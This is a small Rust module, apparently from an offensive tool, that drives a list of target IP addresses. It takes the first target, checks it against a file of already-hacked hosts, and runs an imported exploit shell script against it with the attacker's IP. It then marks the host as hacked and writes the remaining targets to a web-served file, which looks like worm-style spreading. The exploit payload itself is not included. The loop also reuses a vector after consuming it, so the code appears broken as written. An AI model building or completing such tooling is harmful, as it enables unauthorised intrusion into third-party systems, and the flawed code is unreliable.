mod exploit;
mod file_reading;
mod file_writing;

/*
conf/ip_addr_to_hack => static
read first line


open conf/already_hacked => added address

check if first_line in conf/already_hacked

if  no {
    hack ip_first_line()
}
write all the rest of ip_addr_to_hack in rest_to_hack

www/rest_to_hack => write all

*/

//use std::net::IpAddr;

pub fn princip(my_ip: String) {

    // first_target_line: String
    let first_target_line = file_reading::get_target_line();

    // already_targeted_vector: Vec<String>
    let mut already_targeted_vector = file_reading::get_vec_targeted();

    let mut find = false;

    for already_targeted in already_targeted_vector {
        
        if already_targeted == first_target_line {
            find = true;
        }

    }

    if find == false {
        exploit::execute_shell_script(&my_ip, &first_target_line);
        already_targeted_vector.push(first_target_line);
        file_writing::write_already_targeted(already_targeted_vector);
    }
    let rest_to_hack = file_writing::pop_first_line_target();
    file_writing::write_rest_to_hack(rest_to_hack);

}
